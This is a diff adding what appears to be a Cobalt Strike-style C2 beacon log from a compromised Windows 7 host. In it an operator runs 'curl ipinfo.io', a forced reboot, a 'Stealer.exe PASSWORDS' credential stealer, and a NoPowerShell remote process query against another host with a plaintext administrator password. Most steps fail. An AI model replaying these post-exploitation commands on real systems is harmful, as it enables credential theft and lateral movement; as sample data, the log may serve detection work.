@@ -1,0 +1,38 @@
+12/14 09:51:25 UTC [metadata] 210.1.58.27 <- 210.1.58.27; computer: TSBIZ; user: Malicious UserName; process: jh.exe; pid: 4252; os: Windows; version: 6.1; build: 7601; beacon arch: x64 (x64)
+12/14 09:51:32 UTC [input] <jhc> shell curl ipinfo.io
+12/14 09:51:32 UTC [task] <T1059> Tasked beacon to run: curl ipinfo.io
+12/14 09:51:32 UTC [checkin] host called home, sent: 45 bytes
+12/14 09:51:33 UTC [output]
+received output:
+'curl' is not recognized as an internal or external command,
+operable program or batch file.
+
+
+12/14 09:51:46 UTC [task] <T1059> Tasked beacon to run: shutdown -r -t 0
+12/14 09:51:48 UTC [checkin] host called home, sent: 47 bytes
+12/14 09:51:49 UTC [output]
+received output:
+Access is denied.(5)
+
+
+12/14 09:51:59 UTC [task] <T1093> Tasked beacon to run .NET program: Stealer.exe PASSWORDS
+12/14 09:52:01 UTC [checkin] host called home, sent: 149565 bytes
+12/14 09:52:03 UTC [output]
+received output:
+Starting..
+
+
+12/14 09:53:52 UTC [task] <T1093> Tasked beacon to run .NET program: NoPowerShell.exe Get-Process -ComputerName win7.sun.com -Username administrator -Password dc123.com
+12/14 09:53:55 UTC [checkin] host called home, sent: 196303 bytes
+12/14 09:54:01 UTC [output]
+received output:
+Get-Process : System.UnauthorizedAccessException: Access is denied. (Exception from HRESULT: 0x80070005 (E_ACCESSDENIED))
+   at System.Runtime.InteropServices.Marshal.ThrowExceptionForHRInternal(Int32 errorCode, IntPtr errorInfo)
+   at System.Management.ManagementScope.InitializeGuts(Object o)
+   at System.Management.ManagementScope.Initialize()
+   at NoPowerShell.HelperClasses.WmiHelper.GetScope(String wmiNamespace, String computerName, String username, String password)
+   at NoPowerShell.HelperClasses.WmiHelper.ExecuteWmiQuery(String wmiNamespace, String wmiQuery, String computerName, String username, String password)
+   at NoPowerShell.Commands.Management.GetProcessCommand.Execute(CommandResult pipeIn)
+   at NoPowerShell.Program.Main(String[] args)
+
+
